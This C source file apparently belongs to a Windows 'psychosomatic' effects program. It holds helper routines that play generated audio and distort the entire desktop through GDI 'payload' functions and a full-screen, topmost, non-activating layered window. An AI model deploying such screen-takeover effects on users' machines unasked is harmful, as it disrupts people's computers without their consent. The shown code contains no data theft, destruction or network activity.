#pragma once
#include "psychosomatic.h"

// le skid au chocolat
LPSTR* WINAPI CommandLineToArgvA(_In_ LPSTR lpCmdline, _Out_ PINT numargs) {
	DWORD argc;
	LPSTR* argv;
	LPSTR s;
	LPSTR d;
	LPSTR cmdline;
	int qcount, bcount;

	if (!numargs || *lpCmdline == 0) {
		SetLastError(ERROR_INVALID_PARAMETER);
		return NULL;
	}

	/* --- First count the arguments */
	argc = 1;
	s = lpCmdline;
	/* The first argument, the executable path, follows special rules */
	if (*s == '"')
	{
		/* The executable path ends at the next quote, no matter what */
		s++;
		while (*s)
			if (*s++ == '"')
				break;
	}
	else
	{
		/* The executable path ends at the next space, no matter what */
		while (*s && *s != ' ' && *s != '\t')
			s++;
	}
	/* skip to the first argument, if any */
	while (*s == ' ' || *s == '\t')
		s++;
	if (*s)
		argc++;

	/* Analyze the remaining arguments */
	qcount = bcount = 0;
	while (*s)
	{
		if ((*s == ' ' || *s == '\t') && qcount == 0)
		{
			/* skip to the next argument and count it if any */
			while (*s == ' ' || *s == '\t')
				s++;
			if (*s)
				argc++;
			bcount = 0;
		}
		else if (*s == '\\')
		{
			/* '\', count them */
			bcount++;
			s++;
		}
		else if (*s == '"')
		{
			/* '"' */
			if ((bcount & 1) == 0)
				qcount++; /* unescaped '"' */
			s++;
			bcount = 0;
			while (*s == '"')
			{
				qcount++;
				s++;
			}
			qcount = qcount % 3;
			if (qcount == 2)
				qcount = 0;
		}
		else
		{
			/* a regular character */
			bcount = 0;
			s++;
		}
	}

	/* Allocate in a single lump, the string array, and the strings that go
	 * with it. This way the caller can make a single LocalFree() call to free
	 * both, as per MSDN.
	 */
	argv = LocalAlloc(LMEM_FIXED, ((SIZE_T)argc + 1) * sizeof(LPSTR) + (strlen(lpCmdline) + 1) * sizeof(char));
	if (!argv)
		return NULL;
	cmdline = (LPSTR)(argv + argc + 1);
	strcpy(cmdline, lpCmdline);

	/* --- Then split and copy the arguments */
	argv[0] = d = cmdline;
	argc = 1;
	/* The first argument, the executable path, follows special rules */
	if (*d == '"')
	{
		/* The executable path ends at the next quote, no matter what */
		s = d + 1;
		while (*s)
		{
			if (*s == '"')
			{
				s++;
				break;
			}
			*d++ = *s++;
		}
	}
	else
	{
		/* The executable path ends at the next space, no matter what */
		while (*d && *d != ' ' && *d != '\t')
			d++;
		s = d;
		if (*s)
			s++;
	}
	/* close the executable path */
	*d++ = 0;
	/* skip to the first argument and initialize it if any */
	while (*s == ' ' || *s == '\t')
		s++;
	if (!*s)
	{
		/* There are no parameters so we are all done */
		argv[argc] = NULL;
		*numargs = argc;
		return argv;
	}

	/* Split and copy the remaining arguments */
	argv[argc++] = d;
	qcount = bcount = 0;
	while (*s)
	{
		if ((*s == ' ' || *s == '\t') && qcount == 0)
		{
			/* close the argument */
			*d++ = 0;
			bcount = 0;

			/* skip to the next one and initialize it if any */
			do {
				s++;
			} while (*s == ' ' || *s == '\t');
			if (*s)
				argv[argc++] = d;
		}
		else if (*s == '\\')
		{
			*d++ = *s++;
			bcount++;
		}
		else if (*s == '"')
		{
			if ((bcount & 1) == 0)
			{
				/* Preceded by an even number of '\', this is half that
				 * number of '\', plus a quote which we erase.
				 */
				d -= bcount / 2;
				qcount++;
			}
			else
			{
				/* Preceded by an odd number of '\', this is half that
				 * number of '\' followed by a '"'
				 */
				d = d - bcount / 2 - 1;
				*d++ = '"';
			}
			s++;
			bcount = 0;
			/* Now count the number of consecutive quotes. Note that qcount
			 * already takes into account the opening quote if any, as well as
			 * the quote that lead us here.
			 */
			while (*s == '"')
			{
				if (++qcount == 3)
				{
					*d++ = '"';
					qcount = 0;
				}
				s++;
			}
			if (qcount == 2)
				qcount = 0;
		}
		else
		{
			/* a regular character */
			*d++ = *s++;
			bcount = 0;
		}
	}
	*d = '\0';
	argv[argc] = NULL;
	*numargs = argc;

	return argv;
}

COLORREF WINAPI HUE(_In_ INT i) {
	INT xh = (INT)(((DOUBLE)(60 - abs((((i % 120))) - 60)) / (DOUBLE)60) * 255);
	i = i % 360;
	if (i < 180) {
		if (i < 60)
			return RGB(255, xh, 0);
		else if (i < 120)
			return RGB(xh, 255, 0);
		else
			return RGB(0, 255, xh);
	}
	else {
		if (i < 240)
			return RGB(0, xh, 255);
		else if (i < 300)
			return RGB(xh, 0, 255);
		else
			return RGB(255, 0, xh);
	}
}

VOID DebugLine(_In_ LPWSTR dbgLine) {
	#ifdef DEBUG
		wprintf(L"%ls\n", dbgLine);
	#endif // DEBUG
}

VOID WINAPI PrintError() {
	wchar_t buf[256];
	wchar_t nBf[512];
	DWORD err = GetLastError();
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
	StringCchPrintfW(nBf, 512, L"[WinError %lu] %ls\n", err, buf);
	wprintf(L"%ls", nBf);
}
VOID WINAPI MsgError(DWORD err) {
	wchar_t buf[256];
	wchar_t nBf[512];
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, err, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
	StringCchPrintfW(nBf, 512, L"[WinError %lu] %ls\n", err, buf);
	MessageBox(NULL, nBf, L"Error", MB_ICONERROR);
}

VOID WINAPI ExecuteAudioPayload(_In_ AUDIO_PARAMS AudioPayload, _In_ INT nSeconds) {
	SIZE_T nCount = (SIZE_T)nSeconds * AudioPayload.dwHertz;
	HANDLE hHeap = GetProcessHeap();
	PSHORT lpData = HeapAlloc(hHeap, 0, nCount * sizeof(SHORT));
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, AudioPayload.dwHertz, AudioPayload.dwHertz * sizeof(SHORT), 2, 16, 0 };
	WAVEHDR wHeader = { (PCHAR)lpData, (DWORD)(nCount * sizeof(SHORT)), 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &waveFormat, 0, 0, 0);

	AudioPayload.AudioFunc(lpData, (LONG)nCount, AudioPayload.lParam);

	waveOutPrepareHeader(hwo, &wHeader, sizeof(wHeader));
	waveOutWrite(hwo, &wHeader, sizeof(wHeader));

	Sleep(nSeconds * 1000);

	waveOutReset(hwo);
	waveOutUnprepareHeader(hwo, &wHeader, sizeof(wHeader));
	HeapFree(hHeap, 0, lpData);
}

VOID WINAPI ExecuteShaderPayload(_In_ GDI_PAYLOAD_PARAMS GdiPayload) {
	HDC hdc = GetDC(0);
	HDC dcMem = CreateCompatibleDC(hdc);
	INT w = GdiPayload.w;
	INT h = GdiPayload.h;

	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	HANDLE hHeap = GetProcessHeap( );
	SIZE_T nSz = (SIZE_T)w * (SIZE_T)h * sizeof(COLORREF);
	PRGBQUAD prgbsrc = HeapAlloc(hHeap, 0, nSz);
	PRGBQUAD prgbdst = NULL;
	if (prgbsrc == NULL) return;

	HBITMAP hbm = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &prgbdst, NULL, 0);
	if (hbm == 0) {
		return;
	}
	FPS fps = GdiPayload.fps;

	TIME_T mStart = ((LONGLONG)GdiPayload.dwStartPosInSeconds * 1000);
	TIME_T tStart = GetTickCountEx() + mStart;
	TIME_T tEnd   = tStart + ((LONGLONG)GdiPayload.dwDurationInSeconds * 1000);
	
	INT fpsPerSec = 100 / fps;
	TIME_T tTimePassed = 0;
	INT i;

	SelectObject(dcMem, hbm);
	
	while ((GetTickCountEx() + mStart) < tEnd) {
		tTimePassed = (GetTickCountEx() + mStart) - tStart;
		i = (INT)(tTimePassed * fpsPerSec) / 10;

		if (GdiPayload.PreFunc != NULL) {
			GdiPayload.PreFunc(hdc, i, tTimePassed, w, h, GdiPayload.lParam);
		}

		BitBlt(dcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

		RtlCopyMemory(prgbsrc, prgbdst, nSz);
		GdiPayload.PayloadFunc(prgbsrc, prgbdst, hdc, i, tTimePassed, w, h, GdiPayload.lParam);

		BitBlt(hdc, 0, 0, w, h, dcMem, 0, 0, SRCCOPY);

		Sleep(10);
	}

	DeleteObject(hbm);
	DeleteDC(dcMem);
	DeleteDC(hdc);
	HeapFree(hHeap, 0, prgbsrc);
}

DWORD WINAPI GdiThreadHandler(_In_ LPVOID lpPayloadParams) {
	PPAYLOAD_PARAMS Payload = (PPAYLOAD_PARAMS)lpPayloadParams;
	ExecuteShaderPayload(Payload->GdiPayload);
	return 0;
}

VOID WINAPI ExecutePayload(_In_ PAYLOAD_PARAMS Payload) {
	DWORD dwThreadId;

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GdiThreadHandler, &Payload, 0, &dwThreadId);
	if (!hThread) return;
	SetThreadPriorityBoost(hThread, TRUE);
	SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

	ExecuteAudioPayload(Payload.AudioPayload, Payload.GdiPayload.dwDurationInSeconds);

	WaitForSingleObject(hThread, -1);
	TerminateThread(hThread, 0);
	CloseHandle(hThread);
}

RGBQUAD COLORREFToRGBQUAD(_In_ COLORREF color) {
	RGBQUAD rgb = { GetRValue(color), GetGValue(color), GetBValue(color) };
	return rgb;
}
COLORREF RGBQUADToCOLORREF(_In_ RGBQUAD color) {
	return color.rgb;
}
LONG WINAPI randi(_In_ INT start, _In_ INT end) {
	return (rand() % abs(start - end - 1)) + start;
}

ULONGLONG PsGenerateSeed() {
	HCRYPTPROV prov;
	LONG keySz = 6;
	BYTE* pbData = malloc(keySz);
	if (!pbData)
		return 0;
	if (!CryptAcquireContext(&prov, NULL, L"Microsoft Base Cryptographic Provider v1.0", PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		free(pbData);
		return 0;
	}

	if (!CryptGenRandom(prov, keySz, pbData)) {
		free(pbData);
		CryptReleaseContext(prov, 0);
		return 0;
	}
	ULONGLONG res = 0;

	for (INT i = 0; i < keySz; i++) {
		res += (SIZE_T)pbData[i] * (LONG)powl(255, i);
	}

	free(pbData);
	CryptReleaseContext(prov, 0);
	return res;
}
LRESULT WINAPI psLayeredWindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
		case (WM_DESTROY):
			PostQuitMessage(0);
		default:
			return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}
	return 0;
}

DWORD WINAPI PsLdRedrawThread(_In_ PVOID lplRta) {
	PLWD_REDRAW_THREAD_ARGS plWp = (PLWD_REDRAW_THREAD_ARGS)lplRta;
	DWORD dwFps = plWp->lwp.blendMode.fps;
	DWORD dwSleepFps = 0;
	if (dwFps)
		dwSleepFps = 1000 / dwFps;
	DebugLine(L"Redraw thread started");
	TIME_T startTime = GetTickCountEx();
	TIME_T nextMeasure = startTime + 1000, tt;
	UINT fpsThisSecond = 0;
	do {
		tt = GetTickCountEx();
		plWp->lwp.gdiPayload(plWp->plWp->memDc, plWp->plWp->hdc, plWp->plWp->memBitmap, plWp->plWp->w, plWp->plWp->h, tt - startTime, plWp->lwp.lParam);
		if (plWp->lwp.blendMode.uBlendMode == PS_BLENDMODE_FUNCTION)
			UpdateLayeredWindow(plWp->hWnd, plWp->plWp->desk, &(plWp->plWp->wndSzStart), &(plWp->plWp->wndSzEnd), plWp->plWp->memDc, &(plWp->plWp->wndSzStart), 0, &(plWp->lwp.blendMode.blendFn), ULW_ALPHA);
		else if (plWp->lwp.blendMode.uBlendMode == PS_BLENDMODE_OPAQUE)
			UpdateLayeredWindow(plWp->hWnd, plWp->plWp->desk, &(plWp->plWp->wndSzStart), &(plWp->plWp->wndSzEnd), plWp->plWp->memDc, &(plWp->plWp->wndSzStart), 0, NULL, ULW_OPAQUE);
		else if (plWp->lwp.blendMode.uBlendMode == PS_BLENDMODE_TRANSPARENT_COLOR)
			UpdateLayeredWindow(plWp->hWnd, plWp->plWp->desk, &(plWp->plWp->wndSzStart), &(plWp->plWp->wndSzEnd), plWp->plWp->memDc, &(plWp->plWp->wndSzStart), plWp->lwp.blendMode.transparentClr, NULL, ULW_COLORKEY);
		if (dwSleepFps)
			Sleep(dwSleepFps);
		#ifdef DEBUG
		if (tt >= nextMeasure) {
			nextMeasure = tt + 1000;
			printf("FPS: %u\n", fpsThisSecond);

		}
		fpsThisSecond++;
		#endif // DEBUG
	} while (dwFps);
	return 0;
}

BOOL PsLdWndNew(_In_ LAYERED_WINDOW_PARAMS lwp, _In_ PLWD_REDRAW_THREAD_ARGS redrawThread, _Out_ PRESERVED_LAYERED_WINDOW_DATA* pplWd, _Out_ HWND* pHwnd, _Out_ LPWSTR pclassName, _Out_ HINSTANCE* phInst, _Out_ ULONGLONG* pSeed, _Inout_ PBOOL pumpWhile, _Out_ HANDLE* redrawThreadHandle) {
	WNDCLASSW wndc;
	ULONGLONG seed = PsGenerateSeed();
	HINSTANCE hInstance = GetModuleHandle(0);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	StringCchPrintfW(pclassName, 27, L"psychosomaticWnd%llu", seed);
	ZeroMemory(&wndc, sizeof(WNDCLASSW));

	wndc.hInstance = hInstance;
	wndc.lpszClassName = pclassName;
	wndc.lpfnWndProc = psLayeredWindowProc;
	wndc.style = CS_DBLCLKS;
	wndc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndc.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!RegisterClassW(&wndc)) {
		DebugLine(L"Failed to register class!");
		PrintError();
		return FALSE;
	}
	HWND hWnd = CreateWindowExW(
			WS_EX_LAYERED | WS_EX_TOPMOST | WS_EX_NOACTIVATE,
			pclassName,
			pclassName,
			WS_OVERLAPPEDWINDOW,
			0,
			0,
			w,
			h,
			HWND_DESKTOP,
			NULL,
			hInstance,
			NULL
		);
	if (!hWnd) {
		DebugLine(L"Failed to create window!");
		return FALSE;
	}
	
	PRESERVED_LAYERED_WINDOW_DATA plWp = malloc(sizeof(RESERVED_LAYERED_WINDOW_DATA));
	if (!plWp) {
		DebugLine(L"Out of memory!");
		return FALSE;
	}
	(plWp->plWp) = &lwp;

	HDC hdc = GetDC(hWnd);
	HDC desk = GetDC(HWND_DESKTOP);

	plWp->w = w;
	plWp->h = h;
	plWp->tickStart = (TIME_T)GetTickCountEx();
	plWp->hdc = hdc;
	plWp->memDc = CreateCompatibleDC(hdc);
	plWp->wndSzStart = (POINT){0, 0};
	plWp->wndSzEnd = (SIZE){w, h};
	plWp->desk = desk;

	HBITMAP memBitmap = CreateCompatibleBitmap(hdc, w, h);
	plWp->memBitmap = memBitmap;
	SelectObject(plWp->memDc, memBitmap);

	SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)plWp);

	UpdateWindow(hWnd);
	ShowWindow(hWnd, SW_SHOW);

	plWp->plWp->gdiPayload(plWp->memDc, plWp->hdc, plWp->memBitmap, plWp->w, plWp->h, 0, plWp->plWp->lParam);
	if (lwp.blendMode.uBlendMode == PS_BLENDMODE_FUNCTION)
		UpdateLayeredWindow(hWnd, plWp->desk, &plWp->wndSzStart, &plWp->wndSzEnd, plWp->memDc, &plWp->wndSzStart, 0, &(lwp.blendMode.blendFn), ULW_ALPHA);
	else if (lwp.blendMode.uBlendMode == PS_BLENDMODE_OPAQUE)
		UpdateLayeredWindow(hWnd, plWp->desk, &plWp->wndSzStart, &plWp->wndSzEnd, plWp->memDc, &plWp->wndSzStart, 0, NULL, ULW_OPAQUE);
	else if (lwp.blendMode.uBlendMode == PS_BLENDMODE_TRANSPARENT_COLOR)
		UpdateLayeredWindow(hWnd, plWp->desk, &plWp->wndSzStart, &plWp->wndSzEnd, plWp->memDc, &plWp->wndSzStart, lwp.blendMode.transparentClr, NULL, ULW_COLORKEY);

	*pplWd = plWp;
	*pHwnd = hWnd;
	*phInst = hInstance;
	*pSeed = seed;

	redrawThread->hWnd = hWnd;
	redrawThread->lwp = lwp;
	redrawThread->plWp = plWp;
	*redrawThreadHandle = PsLaunchThread(PsLdRedrawThread, redrawThread);
	

	MSG msg;
	DWORD op = 1;
	while (op) {
		op = GetMessageW(&msg, hWnd, 0, 0);
		if (op == -1) {
			PrintError();
			return FALSE;
		}
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	
	return TRUE;
}

VOID WINAPI PsLdWndFree(LPTSTR className, PRESERVED_LAYERED_WINDOW_DATA plWp, HINSTANCE hInstance, HWND hwnd) {
	DeleteObject(plWp->memBitmap);
	DeleteDC(plWp->memDc);
	DeleteDC(plWp->desk);
	UnregisterClass(className, hInstance);
	//free(className);
	free(plWp);
}

DWORD WINAPI PsLwpThread(_In_ LPVOID lpParamater) {
	LPRESERVED_LWD_DATA_THREAD ldt = (LPRESERVED_LWD_DATA_THREAD)lpParamater;
	ldt->output = PsLdWndNew(ldt->lwp, ldt->pRdta, &ldt->pplWd, ldt->pHwnd, ldt->pclassName,
							 ldt->phInst, ldt->pSeed, ldt->pumpWhile, &(ldt->redrawThread));
	return 0;
}

LPSTR sprintf_auto(char* fmt, ...) {
	va_list args;
	va_start(args, fmt);
	INT requiredSize = _vscprintf(fmt, args);
	LPSTR data = malloc(requiredSize + 1);
	if (!data) {
		va_end(args);
		return NULL;
	}

	ZeroMemory(data, requiredSize + 1);
	vsprintf(data, fmt, args);

	va_end(args);
	return data;
}

PS_LAYERED_WINDOW WINAPI PsLayeredWindowNew(_In_ LAYERED_WINDOW_PARAMS lwp) {
	HWND hWnd = NULL;
	HINSTANCE hInst = NULL;
	PRESERVED_LAYERED_WINDOW_DATA plWp = NULL;
	RESERVED_LWD_DATA_THREAD lpLdt = { 0 }; // malloc(sizeof(RESERVED_LWD_DATA_THREAD));
	ULONGLONG Seed = 0;
	BOOL StillPumping = TRUE;

	lpLdt.lwp = lwp;
	lpLdt.pplWd = plWp;
	lpLdt.pHwnd = &hWnd;
	lpLdt.phInst = &hInst;
	lpLdt.pSeed = &Seed;
	lpLdt.pumpWhile = &StillPumping;
	lpLdt.pRdta = malloc(sizeof(LWD_REDRAW_THREAD_ARGS));
	ZeroMemory(lpLdt.pclassName, sizeof(lpLdt.pclassName));
	
	lpLdt.hThread = PsLaunchThread(PsLwpThread, &lpLdt);
	lpLdt.bFreed = FALSE;
	return lpLdt;
}

DWORD CALLBACK PsAudioThread(LPVOID lpParam) {
	AUDIO_PARAMS audioParams = *((LPAUDIO_PARAMS)lpParam);
	ExecuteAudioPayload(audioParams, audioParams.dwReserved);
	return 0;
}

BOOL WINAPI PsCloseLayeredWindow(_In_ PS_LAYERED_WINDOW lWp) {
	if (lWp.pHwnd == NULL)
		return FALSE;
	if (lWp.bFreed)
		return FALSE;
	//return TRUE;
	DestroyWindow(*(lWp.pHwnd));
	TerminateThread(lWp.hThread, 0);
	TerminateThread(lWp.redrawThread, 0);
	//PsLdWndFree(lWp.pclassName, lWp.pplWd, *(lWp.phInst), *(lWp.pHwnd));
	CloseHandle(lWp.hThread);
	CloseHandle(lWp.redrawThread);
	//free(lWp.pRdta);
	lWp.bFreed = TRUE;
	return TRUE;
}
